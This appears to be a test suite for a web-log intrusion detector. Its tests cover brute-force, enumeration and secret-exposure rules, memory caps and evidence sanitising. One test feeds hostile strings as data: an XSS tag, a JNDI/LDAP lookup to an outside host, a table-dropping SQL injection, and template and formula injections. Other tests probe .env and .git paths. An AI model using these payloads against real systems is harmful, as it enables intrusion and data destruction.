import { describe, expect, it } from 'vitest';
import {
  albLine,
  fakeJwt,
  Harness,
  type LineSpec,
  prng,
  SLOT,
  T0,
  times,
} from '../../test/support/alb-lines.js';
import type { WebFindingDraft } from './draft.js';
import { MAX_EVIDENCE_BYTES, webEvidenceSchema } from './evidence.js';
import { EvictedLedger, isSampled } from './evicted.js';
import { DEFAULT_LIMITS, type WebLimits } from './limits.js';
import type { WebRuleId } from './rules.js';

/**
 * O motor contra quem escreve o log: a query que não pode sair, os tetos de memória cheios de propósito, e o que se põe no
 * User-Agent e no caminho.
 */

const ATTACKER = '198.51.100.7';
const of = (drafts: readonly WebFindingDraft[], rule: WebRuleId): WebFindingDraft[] =>
  drafts.filter((draft) => draft.ruleId === rule);

const login = (client: string, status: number, extra: LineSpec = {}): LineSpec => ({
  client,
  method: 'POST',
  path: '/login',
  status,
  ...extra,
});

/** Um cliente diferente por número: um /64 do bloco de documentação (RFC 3849). */
const visitor = (i: number): string => `2001:db8:${(i >> 16).toString(16)}:${(i & 0xffff).toString(16)}::1`;

const failures = (count: number, client = ATTACKER): LineSpec[] => times(count, () => login(client, 401));
const probes = (count: number, client = ATTACKER): LineSpec[] =>
  times(count, (i) => ({ client, path: `/x${i}/.env`, status: 404 }));

function feed(lines: readonly LineSpec[], options: ConstructorParameters<typeof Harness>[0] = {}): Harness {
  const harness = new Harness(options);
  harness.feed(lines);
  return harness;
}

describe('nenhum byte de query string sai do motor', () => {
  /** Tráfego que dispara todas as regras, com a query dada em cada lugar em que ela pode vir. */
  function traffic(query: (i: number) => string, random: () => number): LineSpec[] {
    const places = [
      (path: string, mark: string): LineSpec => ({ path: `${path}?${mark}` }),
      (path: string, mark: string): LineSpec => ({ path: `${path}?a=${mark}&b=${mark}#${mark}` }),
      (path: string, mark: string): LineSpec => ({ path: `${path}%3F${mark}` }),
      (path: string, mark: string): LineSpec => ({ path: `${path}%3fa=${mark}` }),
      (path: string, mark: string): LineSpec => ({
        path: `${path}?${mark}`,
        redirect: `https://h:443${path}?${mark}`,
      }),
      (path: string, mark: string): LineSpec => ({ path: `${path}?${mark}`, trace: `Root=1-${mark}` }),
      (path: string, mark: string): LineSpec => ({
        path: `${path}?${mark}`,
        userAgent: `sqlmap (https://h/?${mark})`,
      }),
      (path: string, mark: string): LineSpec => ({
        path: `${path}?${mark}" "${mark}`,
        userAgent: `x"${mark}=${mark}`,
      }),
      (path: string, mark: string): LineSpec => ({ path: `${path}?${mark}`, userAgent: `sqlmap ?${mark}` }),
    ];
    const lines: LineSpec[] = [];
    for (let i = 0; i < 4_000; i += 1) {
      const mark = query(i);
      const client = `198.51.100.${(i % 9) + 1}`;
      const kind = i % 6;
      const base: LineSpec =
        kind === 0
          ? login(client, i % 100 === 0 ? 302 : 401)
          : kind === 1
            ? { client, path: `/p${i}`, status: 404 }
            : kind === 2
              ? { client, path: `/d${i % 50}/.env`, status: 404 }
              : kind === 3
                ? { client, path: '/backup.sql', status: 200, sent: 70_000 }
                : kind === 4
                  ? login(`192.0.2.${(Math.floor(i / 6) % 120) + 1}`, 401)
                  : { client, path: `/api/reset/${i}`, status: 400 };
      const place = places[Math.floor(random() * places.length)] ?? places[0];
      lines.push({ ...base, ...place?.(base.path ?? '/', mark) });
    }
    return lines;
  }

  const outputs = (lines: readonly LineSpec[]): { text: string; drafts: WebFindingDraft[] } => {
    const harness = new Harness();
    for (const end of [T0 - 2 * SLOT, T0 - SLOT, T0]) harness.feed(lines, end, T0);
    const result = harness.evaluate();
    return {
      drafts: result.drafts,
      text: JSON.stringify(result) + JSON.stringify(harness.engine.snapshot()),
    };
  };

  it.each([1, 2, 3, 4, 5])('marcas ASCII aleatórias, semente %i', (seed) => {
    const random = prng(seed);
    const alphabet = 'qwxzkyjQWXZKYJ';
    const marks: string[] = [];
    const { text, drafts } = outputs(
      traffic(() => {
        let mark = '';
        for (let j = 0; j < 9; j += 1) mark += alphabet.charAt(Math.floor(random() * alphabet.length));
        marks.push(mark.toLowerCase());
        return mark;
      }, random),
    );
    const rules = new Set(drafts.map((draft) => draft.ruleId));
    for (const rule of ['990401', '990402', '990403', '990404', '990405', '990406', '990407']) {
      expect(rules).toContain(rule);
    }
    // Nenhum pedaço de 4 letras seguidas de marca nenhuma: o resto do texto não tem essa sequência de letras.
    const runs = new Set<string>();
    let run = '';
    for (const char of `${text.toLowerCase()} `) {
      if ('qwxzkyj'.includes(char)) {
        run += char;
        continue;
      }
      if (run.length >= 4) runs.add(run);
      run = '';
    }
    expect([...runs]).toEqual([]);
    expect(marks.length).toBe(4_000);
  });

  it('bytes que não existem em mais lugar nenhum, crus e codificados', () => {
    for (const bytes of ['ÞðþÐ', '%DE%F0%FE%D0', '%de%f0%fe%d0']) {
      const { text } = outputs(traffic((i) => `${bytes}${i}=${bytes}`, prng(9)));
      for (const trace of ['Þ', 'ð', 'þ', 'Ð', '%de', '%f0', '\\u00de']) {
        expect(text.toLowerCase()).not.toContain(trace.toLowerCase());
      }
    }
  });

  it('e-mail, CPF, JWT e token de redefinição no caminho saem mascarados', () => {
    const jwt = fakeJwt();
    const secrets = ['fulano.de.tal@exemplo.com.br', '123.456.789-09', jwt, 'Tk9fUmVzZXRfVG9rZW5fMTIz'];
    const lines = secrets.flatMap((secret) => [
      ...times(30, () => login(ATTACKER, 401, { path: `/login/${secret}` })),
      ...times(30, (i) => ({ client: ATTACKER, path: `/reset/${secret}/${i}/.env`, status: 404 })),
      { client: ATTACKER, path: `/${secret}/.env`, status: 200, sent: 900 },
      ...times(200, (i) => ({ client: ATTACKER, path: `/${encodeURIComponent(secret)}/${i}x`, status: 404 })),
    ]);
    const { text, drafts } = outputs(lines);
    expect(drafts.length).toBeGreaterThan(3);
    for (const secret of secrets) expect(text.toLowerCase()).not.toContain(secret.toLowerCase());
    expect(text).not.toContain('12345678909');
    expect(text).not.toContain('fulano');
  });
});

describe('cardinalidade', () => {
  it('100 mil IPs de uma requisição não escondem quem tem 25', () => {
    const harness = new Harness();
    const flood = (from: number, count: number): LineSpec[] =>
      times(count, (i) => ({ client: visitor(from + i), path: `/p${i}`, status: 404 }));
    harness.feed(flood(0, 50_000));
    harness.feed([...failures(25), ...probes(400, '192.0.2.9')]);
    harness.feed(flood(50_000, 50_000));
    expect(harness.engine.usage.clients).toBeLessThanOrEqual(DEFAULT_LIMITS.maxClients);
    const result = harness.evaluate();
    expect(result.notes).toContain('truncated');
    const [brute] = of(result.drafts, '990405');
    expect(brute).toMatchObject({ sourceIp: ATTACKER, evidence: { truncated: true } });
    expect(brute?.evidence.notes).toContain('counts_are_floor');
    expect(of(result.drafts, '990402')[0]?.sourceIp).toBe('192.0.2.9');
  }, 60_000);

  it('quem ataca devagar no meio da enchente não é zerado a cada limpeza', () => {
    const limits = { ...DEFAULT_LIMITS, maxClients: 2_000 };
    const harness = new Harness({ limits });
    for (let i = 0; i < 25; i += 1) {
      harness.feed([login(ATTACKER, 401)]);
      harness.feed(times(1_000, (j) => ({ client: visitor(i * 1_000 + j), path: '/', status: 404 })));
    }
    expect(of(harness.evaluate().drafts, '990405')[0]).toMatchObject({
      sourceIp: ATTACKER,
      evidence: { counters: { failures: 25 } },
    });
  });

  it('trocar de /64 a cada requisição enche o teto, não a memória', () => {
    const limits = { ...DEFAULT_LIMITS, maxClients: 5_000 };
    const harness = feed(
      [
        ...times(20_000, (i) => ({
          client: `2001:db8:${(i >> 8).toString(16)}:${(i & 255).toString(16)}::1`,
          status: 404,
        })),
        ...failures(20),
      ],
      { limits },
    );
    expect(harness.engine.usage.clients).toBeLessThanOrEqual(5_000);
    expect(of(harness.evaluate().drafts, '990405')).toHaveLength(1);
  });

  it('20 mil IPs com uma falha de login cada: a distribuída, o teimoso e o que entrou aparecem', () => {
    const harness = feed([
      ...times(10_000, (i) => login(visitor(i), 401)),
      ...failures(30),
      ...times(10_000, (i) => login(visitor(20_000 + i), 401)),
      login(ATTACKER, 302),
    ]);
    expect(harness.engine.usage.loginCells).toBeLessThanOrEqual(DEFAULT_LIMITS.maxLoginCells);
    const { drafts } = harness.evaluate();
    expect(of(drafts, '990407')[0]?.evidence.counters.failures).toBeGreaterThanOrEqual(20_000);
    expect(of(drafts, '990405')[0]?.sourceIp).toBe(ATTACKER);
    expect(of(drafts, '990406')[0]?.sourceIp).toBe(ATTACKER);
  });

  it('inventar rotas de login não tira a verdadeira da contagem', () => {
    const invented = times(3_000, (i) =>
      login(visitor(i), 401, {
        path: `/r${'abcdefghij'[i % 10]}${'klmnopqrst'[((i / 10) % 10) | 0]}${'uvwxyzabcd'[((i / 100) % 10) | 0]}/login`,
      }),
    );
    for (const lines of [
      [...invented, ...failures(20)],
      [...failures(20), ...invented],
      failures(20).flatMap((line, i) => [line, ...invented.slice(i * 100, i * 100 + 100)]),
    ]) {
      expect(of(feed(lines).evaluate().drafts, '990405').map((draft) => draft.sourceIp)).toEqual([ATTACKER]);
    }
  });

  it('nem 20 rotas inventadas com 20 tentativas cada, de IPs diferentes', () => {
    const invented = times(400, (i) =>
      login(visitor(i), 401, { path: `/${'abcdefghijklmnopqrst'[i % 20]}x/login` }),
    );
    const [draft] = of(feed([...invented, ...failures(20)]).evaluate().drafts, '990405');
    // A verdadeira cai na rota comum: a contagem é a mesma, só o nome da rota se perde.
    expect(draft).toMatchObject({
      sourceIp: ATTACKER,
      evidence: { route: '/{etc}', counters: { failures: 20 } },
    });
  });

  it('subdomínios de certificado curinga: o teto de hosts não cala a força bruta nem a rota declarada', () => {
    const flood = times(5_000, (i) => ({ client: visitor(i), domain: `h${i}.exemplo.com.br` }));
    const { drafts, notes } = feed([...flood, ...failures(20)]).evaluate();
    expect(notes).toContain('truncated');
    expect(of(drafts, '990405')).toHaveLength(1);
    const routes = [
      {
        id: 'r',
        host: 'loja.exemplo.com.br',
        method: 'POST' as const,
        path: '/minha/porta',
        kind: 'login' as const,
        failureCodes: [401],
        successCodes: [200],
        multiplier: 1,
      },
    ];
    const declared = times(20, () => login(ATTACKER, 401, { path: '/minha/porta' }));
    expect(of(feed([...flood, ...declared], { routes }).evaluate().drafts, '990405')).toHaveLength(1);
  });

  it('a distribuída por subdomínios além do teto soma à parte', () => {
    const flood = times(60, (i) => ({ client: visitor(i), domain: `pre${i}.exemplo.com.br` }));
    const spread = times(600, (i) =>
      login(visitor(100 + (i % 100)), 401, { domain: `h${i}.exemplo.com.br` }),
    );
    const [draft] = of(feed([...flood, ...spread]).evaluate().drafts, '990407');
    expect(draft?.evidence).toMatchObject({ host: null, counters: { failures: 600, clients: 100 } });
  });

  it('um site que responde tudo igual não empurra para fora a resposta de verdade', () => {
    const limits = { ...DEFAULT_LIMITS, maxAnswered: 30 };
    const variants = [
      '.env',
      '.env.local',
      '.env.prod',
      '.env.dev',
      '.git/config',
      '.git/HEAD',
      '.aws/x',
      'backup.sql',
      'db.sql',
      'phpinfo.php',
    ];
    const spa = times(400, (i) => ({
      client: visitor(i),
      path: `/a${i}/${variants[i % variants.length] ?? ''}`,
      status: 200,
      sent: 5_000,
      domain: `spa${Math.floor(i / 10) % 40}.exemplo.com.br`,
    }));
    const leak = { client: ATTACKER, path: '/.env', status: 200, sent: 731, domain: 'api.exemplo.com.br' };
    const { drafts } = feed([...spa, leak], { limits }).evaluate();
    expect(of(drafts, '990403').map((draft) => draft.sourceIp)).toContain(ATTACKER);
  });

  it('encher os tamanhos da página inicial não faz parecer que só o atacante a pediu', () => {
    const own = times(16, (i) => ({ client: ATTACKER, path: '/', status: 200, sent: 900 + i * 100 }));
    const leak = { client: ATTACKER, path: '/.env', status: 200, sent: 900 };
    const other = { client: '192.0.2.50', path: '/', status: 200, sent: 80_000 };
    expect(of(feed([...own, leak]).evaluate().drafts, '990403')).toEqual([]);
    expect(of(feed([...own, other, leak]).evaluate().drafts, '990403')).toHaveLength(1);
  });

  it('encher os pares de login num slot não cega os seguintes', () => {
    const limits = { ...DEFAULT_LIMITS, maxLoginCells: 2_000 };
    const harness = new Harness({ limits });
    harness.feed(
      times(8_000, (i) => login(visitor(i % 2_000), 401)),
      T0 - SLOT,
      T0,
    );
    expect(harness.engine.usage.loginCells).toBe(2_000);
    harness.feed([...failures(30), login(ATTACKER, 302)], T0, T0);
    expect(harness.engine.usage.loginCells).toBeLessThanOrEqual(2_000);
    const { drafts } = harness.evaluate();
    expect(of(drafts, '990405').map((draft) => draft.sourceIp)).toContain(ATTACKER);
    expect(of(drafts, '990406').map((draft) => draft.sourceIp)).toContain(ATTACKER);
    expect(of(drafts, '990407')[0]?.evidence.counters.failures).toBeGreaterThanOrEqual(8_000);
  });

  it('nem encher uma rota com 2 mil clientes teimosos cega a mesma rota', () => {
    const limits = { ...DEFAULT_LIMITS, maxRouteClients: 200 };
    const lines = times(1_000, (i) => login(visitor(i % 200), 401));
    const { drafts } = feed([...lines, ...failures(30)], { limits }).evaluate();
    expect(of(drafts, '990405').map((draft) => draft.sourceIp)).toEqual([ATTACKER]);
  });

  it('caminhos únicos: os conjuntos têm teto, e o corte é dito', () => {
    const limits = { ...DEFAULT_LIMITS, maxHashCells: 8_192, maxPathSets: 20 };
    const lines = times(40_000, (i) => ({ client: visitor(i % 50), path: `/p${i}`, status: 404 }));
    const harness = feed(lines, { limits });
    expect(harness.engine.usage.pathSets).toBeLessThanOrEqual(20);
    // Um conjunto pode dobrar uma vez ao passar do teto.
    expect(harness.engine.usage.hashCells).toBeLessThanOrEqual(8_192 + 1_024);
    const { drafts } = harness.evaluate();
    // 50 endereços, 800 recusas cada: os que ficaram sem conjunto valem pelas recusas.
    const enumeration = of(drafts, '990404');
    expect(enumeration).toHaveLength(11);
    expect(enumeration.every((draft) => draft.evidence.truncated)).toBe(true);
    expect(enumeration[0]?.eventName).toContain('até 800 caminhos');
  });

  it('rota inventada que responde 404 não gasta o teto de rotas', () => {
    const lines = times(500, (i) =>
      login(visitor(i), 404, { path: `/r${'abcdefghij'[i % 10]}${'klmnopqrst'[((i / 10) % 10) | 0]}/login` }),
    );
    expect(feed(lines).evaluate().notes).toEqual([]);
  });

  it('sem orçamento para o conjunto crescer, a enumeração vale pelas recusas', () => {
    const limits = { ...DEFAULT_LIMITS, maxHashCells: 64 };
    const scan = times(120, (i) => ({ client: ATTACKER, path: `/p${i}`, status: 404 }));
    const [digest] = of(feed(scan, { limits }).evaluate().drafts, '990400');
    expect(digest?.evidence.counters.errors).toBe(120);
  });

  it('encher os conjuntos de caminhos não esconde quem enumera', () => {
    const limits = { ...DEFAULT_LIMITS, maxPathSets: 20 };
    const decoys = times(400, (i) => ({ client: visitor(i % 40), path: `/d${i}`, status: 404 }));
    const scan = times(600, (i) => ({ client: ATTACKER, path: `/p${i}`, status: 404 }));
    const { drafts } = feed([...decoys, ...scan], { limits }).evaluate();
    expect(of(drafts, '990404').map((draft) => draft.sourceIp)).toEqual([ATTACKER]);
  });

  it('User-Agents únicos não crescem a memória dos clientes', () => {
    const harness = feed([
      ...times(30_000, (i) => ({ client: '192.0.2.1', userAgent: `agente-${i}-${'x'.repeat(400)}` })),
      ...failures(20),
    ]);
    expect(harness.engine.usage.clients).toBe(2);
    expect(of(harness.evaluate().drafts, '990405')).toHaveLength(1);
  });

  it('sem lugar para a série de 10 s, a 990406 erra para mais', () => {
    const limits = { ...DEFAULT_LIMITS, maxSeries: 0 };
    const at = (minute: number): number => T0 - SLOT + minute * 60_000;
    const lines = [
      ...times(30, () => login(ATTACKER, 401, { time: at(1) })),
      login(ATTACKER, 302, { time: at(2) }),
    ];
    expect(of(feed(lines, { limits }).evaluate().drafts, '990406')).toHaveLength(1);
  });

  it('amostras têm teto, e o achado sai sem elas', () => {
    const limits = { ...DEFAULT_LIMITS, maxDetails: 5 };
    const harness = feed(times(50, (i) => failures(20, visitor(i))).flat(), { limits });
    expect(harness.engine.usage.details).toBe(5);
    expect(of(harness.evaluate().drafts, '990405')).toHaveLength(11);
  });
});

describe('990407 com clientes que saem da memória', () => {
  /** `clients` clientes com `each` falhas, uma rodada de cada vez. */
  const rounds = (clients: number, each: number, from = 0, extra: LineSpec = {}): LineSpec[] =>
    times(each, () => times(clients, (i) => login(visitor(from + i), 401, extra))).flat();
  const run = (slots: readonly (readonly LineSpec[])[], limits: Partial<WebLimits>): Harness => {
    const harness = new Harness({ limits: { ...DEFAULT_LIMITS, ...limits } });
    slots.forEach((lines, i) => harness.feed(lines, T0 - (slots.length - 1 - i) * SLOT, T0));
    return harness;
  };
  const distributed = (harness: Harness, route = '/login') =>
    of(harness.evaluate().drafts, '990407').filter((draft) => draft.evidence.route === route);
  const counted = (harness: Harness, route = '/login') =>
    distributed(harness, route).map(({ evidence }) => [
      evidence.counters.clients,
      evidence.counters.failures,
    ]);

  describe('poucos barulhentos não viram muitos discretos', () => {
    it('20 clientes com 60 falhas, saindo e voltando no mesmo slot', () => {
      expect(counted(run([rounds(20, 60)], { maxRouteClients: 10 }))).toEqual([]);
      expect(counted(run([rounds(20, 60)], { maxLoginCells: 10 }))).toEqual([]);
    });

    it.each([
      [29, []],
      [30, [[30, 540]]],
      [31, [[31, 558]]],
    ])('%i clientes com 18 falhas em 3 slots: cada um conta uma vez', (clients, expected) => {
      const slot = rounds(clients, 6);
      expect(counted(run([slot, slot, slot], { maxRouteClients: 10 }))).toEqual(expected);
    });

    it.each([
      [[7, 7, 6], [[30, 600]]],
      [[7, 7, 7], []],
      [[8, 8, 8], []],
    ])('30 clientes com %j falhas por slot: o limite de 20 é da janela', (each, expected) => {
      const slots = each.map((count) => rounds(30, count));
      expect(counted(run(slots, { maxRouteClients: 10 }))).toEqual(expected);
      expect(counted(run(slots, {}))).toEqual(expected);
    });

    it('a parte que ficou num slot e a que saiu noutro somam', () => {
      // 30 clientes: 15 falhas que ficam; no slot seguinte, mais falhas que saem, empurradas por 60 barulhentos.
      const noisy = rounds(60, 25, 1_000);
      const at = (more: number) =>
        counted(run([rounds(30, 15), [...rounds(30, more), ...noisy]], { maxRouteClients: 50 }));
      expect(at(10)).toEqual([]);
      expect(at(6)).toEqual([]);
      // Com 5, são 20 de cada um: valem os 30.
      expect(at(5)).toEqual([[30, 600]]);
    });

    it('e a parte que saiu e a que voltou, no mesmo slot', () => {
      const back = [...rounds(40, 15), ...rounds(60, 25, 1_000), ...rounds(40, 6)];
      expect(counted(run([back], { maxRouteClients: 50 }))).toEqual([]);
    });
  });

  describe('a distribuída de verdade não some com a saída forçada', () => {
    const attack = rounds(100, 6);

    it('por barulhentos na mesma rota', () => {
      const noisy = rounds(80, 30, 1_000);
      for (const lines of [
        [...attack, ...noisy],
        [...noisy, ...attack],
        attack.flatMap((line, i) => [line, ...noisy.slice(i * 4, i * 4 + 4)]),
      ]) {
        expect(counted(run([lines], { maxRouteClients: 50 }))).toEqual([[100, 600]]);
      }
    });

    it('por uma enchente noutra rota, que gasta os pares', () => {
      const flood = times(3_000, (i) => login(visitor(5_000 + i), 401, { path: '/entrar' }));
      const lines = attack.flatMap((line, i) => [line, ...flood.slice(i * 5, i * 5 + 5)]);
      expect(counted(run([lines], { maxLoginCells: 300 }))).toEqual([[100, 600]]);
    });

    it('espalhada em 3 slots, com enchente em todos', () => {
      const slot = [...rounds(100, 2), ...rounds(80, 30, 1_000)];
      expect(counted(run([slot, slot, slot], { maxRouteClients: 50 }))).toEqual([[100, 600]]);
    });

    it('por uma enchente noutra rota que gasta também o registro de quem saiu', () => {
      const limits = { maxLoginCells: 300, maxEvictedCells: 2_048 };
      const flood = times(20_000, (i) => login(visitor(5_000 + i), 401, { path: '/entrar' }));
      const lines = attack.flatMap((line, i) => [line, ...flood.slice(i * 33, i * 33 + 33)]);
      const harness = run([[...lines, ...flood.slice(19_800)]], limits);
      expect(harness.engine.usage.evictedCells).toBeLessThanOrEqual(2_048);
      const { drafts } = harness.evaluate();
      const [real] = of(drafts, '990407').filter((draft) => draft.evidence.route === '/login');
      // A rota de verdade é a menor: nunca é raleada, e a conta dela é exata.
      expect(real?.evidence.counters).toMatchObject({ clients: 100, failures: 600 });
      expect(real?.evidence.notes).not.toContain('counts_are_estimated');
      // A da enchente é estimada da amostra, e diz isso.
      const [flooded] = of(drafts, '990407').filter((draft) => draft.evidence.route === '/entrar');
      expect(flooded?.evidence.notes).toContain('counts_are_estimated');
      expect(flooded?.eventName).toContain('cerca de');
      expect(Math.abs((flooded?.evidence.counters.failures ?? 0) / 20_000 - 1)).toBeLessThan(0.25);
    });

    it('a amostra não inventa clientes discretos: só barulhentos, nenhum achado', () => {
      const limits = { maxRouteClients: 50, maxEvictedCells: 64 };
      expect(counted(run([rounds(400, 25)], limits))).toEqual([]);
      expect(counted(run([rounds(400, 12), rounds(400, 12)], limits))).toEqual([]);
    });

    it('a rota que perde o lugar leva junto quem saiu dela', () => {
      const letters = 'abcdefghijklmnopqrst';
      const spread = times(40 * 19, (i) =>
        login(visitor(i), 401, {
          path: `/${letters.charAt(i % 20)}${letters.charAt(Math.floor(i / 20) % 2)}/login`,
        }),
      );
      const harness = run([spread], { maxRouteClients: 5 });
      const [clients, failures] = counted(harness, '/{etc}')[0] ?? [0, 0];
      expect(clients).toBe(failures);
      expect(failures).toBeGreaterThanOrEqual(500);
      expect(failures).toBeLessThanOrEqual(760);
    });
  });

  it('o registro sai da memória com a janela', () => {
    const harness = run([rounds(2_000, 2)], { maxRouteClients: 50 });
    expect(harness.engine.usage.evictedCells).toBeGreaterThan(0);
    harness.evaluate(T0 + 25 * 60_000);
    expect(harness.engine.usage.evictedCells).toBe(0);
    // E volta a zero também pelo caminho do objeto atrasado.
    harness.feed(rounds(2_000, 2), T0, T0 + 26 * 60_000);
    expect(harness.engine.usage.evictedCells).toBeGreaterThan(0);
    harness.evaluate(T0 + 27 * 60_000);
    expect(harness.engine.usage.evictedCells).toBe(0);
  });

  it('o registro raleado tem a soma exata de quem ficou, e só de quem está na amostra', () => {
    const random = prng(8);
    const truth = new Map<number, number>();
    const ledger = new EvictedLedger();
    for (let i = 0; i < 20_000; i += 1) {
      const tag = (Math.floor(random() * 5_000 + 1) * 858_993) | 0;
      const failures = Math.floor(random() * 3) + 1;
      truth.set(tag, Math.min(255, (truth.get(tag) ?? 0) + failures));
      while (isSampled(tag, ledger.shift) && !ledger.add(tag, failures)) {
        if (ledger.cells < 1_024) ledger.grow();
        else ledger.thin();
      }
    }
    expect(ledger.shift).toBeGreaterThan(0);
    const held = new Map(ledger.entries());
    expect(held.size).toBe(ledger.size);
    for (const [tag, failures] of truth) {
      expect(held.get(tag)).toBe(isSampled(tag, ledger.shift) ? failures : undefined);
    }
  });
});

describe('texto do atacante', () => {
  it('bidi, controle, marcação, fórmula e JNDI: a evidência é ASCII imprimível, no formato e no teto', () => {
    const nasty = [
      'a\u202egpj.exe',
      '\u0000\u0007\u001b[31m',
      '<img src=x onerror=alert(1)>',
      '=HYPERLINK(1)',
      '${jndi:ldap://x.exemplo.com.br/a}',
      "'; DROP TABLE findings; --",
      'Ünïcödé\u200b\ufeff',
      'ÿ\u0080þ',
      '"quebra"',
      '\\x41\\"',
      '{{7*7}}',
    ];
    const lines = nasty.flatMap((text) => {
      const encoded = encodeURIComponent(text);
      return [
        ...times(30, () => login(ATTACKER, 401, { userAgent: `sqlmap ${text}` })),
        ...times(30, (i) => ({
          client: ATTACKER,
          path: `/${encoded}/${i}/.env`,
          status: 404,
          userAgent: text,
        })),
        ...times(60, (i) => ({
          client: ATTACKER,
          path: `/${text.split(' ').join('')}/${i}`,
          status: 404,
          domain: text,
        })),
        { client: ATTACKER, path: `/${encoded}/.env`, status: 200, sent: 900 },
      ];
    });
    const harness = feed(lines);
    const { drafts } = harness.evaluate();
    expect(new Set(drafts.map((draft) => draft.ruleId)).size).toBeGreaterThanOrEqual(5);
    for (const draft of drafts) {
      expect(webEvidenceSchema.safeParse(draft.evidence).success).toBe(true);
      const text = JSON.stringify(draft.evidence);
      expect(Buffer.byteLength(text)).toBeLessThanOrEqual(MAX_EVIDENCE_BYTES);
      for (let i = 0; i < text.length; i += 1) {
        const code = text.charCodeAt(i);
        expect(code >= 0x20 && code <= 0x7e).toBe(true);
      }
      for (const trace of ['<', 'onerror', 'jndi', '\\u', 'DROP TABLE', '{{', '$'])
        expect(text).not.toContain(trace);
    }
  });

  it('linhas aleatórias nunca lançam, e toda linha é contada em algum lugar', () => {
    const random = prng(77);
    const harness = new Harness();
    const object = harness.feed([]);
    const good = albLine({ status: 404, path: '/.env' });
    let total = 0;
    for (let i = 0; i < 20_000; i += 1) {
      const chars = [...good];
      const edits = Math.floor(random() * 4);
      for (let j = 0; j < edits; j += 1) {
        const at = Math.floor(random() * chars.length);
        const op = random();
        if (op < 0.4) chars[at] = String.fromCharCode(Math.floor(random() * 256));
        else if (op < 0.7) chars.splice(at, Math.floor(random() * 40));
        else chars.splice(at, 0, ['"', ' ', '\\', '" "', '%', '-'][Math.floor(random() * 6)] ?? '');
      }
      harness.engine.ingest(object, chars.join(''));
      total += 1;
    }
    const result = harness.evaluate();
    const { lines, malformed, foreign } = result.counters;
    expect(lines + malformed + foreign).toBe(total);
    expect(lines).toBeGreaterThan(5_000);
    for (const draft of result.drafts) expect(webEvidenceSchema.safeParse(draft.evidence).success).toBe(true);
  });
});

describe('custo (o número de verdade sai de scripts/bench-weblogs.mjs)', () => {
  it('40 mil linhas variadas em menos de 8 s de CPU, com os tetos respeitados', () => {
    const random = prng(1);
    const lines = Array.from({ length: 40_000 }, (_, i) =>
      albLine({
        time: T0 - Math.floor(random() * SLOT),
        client: visitor(Math.floor(random() * 6_000)),
        path: i % 3 === 0 ? `/produto/${i}?ref=${i}` : `/estatico/${i % 200}.js`,
        status: i % 11 === 0 ? 404 : 200,
        userAgent: `Mozilla/5.0 (variante ${i % 300}) Chrome/140.0`,
      }),
    );
    const harness = new Harness();
    const object = harness.feed([]);
    const started = process.cpuUsage();
    for (const line of lines) harness.engine.ingest(object, line);
    harness.evaluate();
    const { user, system } = process.cpuUsage(started);
    // Alvo: 25 s por milhão (1 s por 40 mil). A folga é para a máquina do CI.
    expect((user + system) / 1e6).toBeLessThan(8);
    expect(harness.engine.usage.clients).toBeLessThanOrEqual(6_000);
  });
});
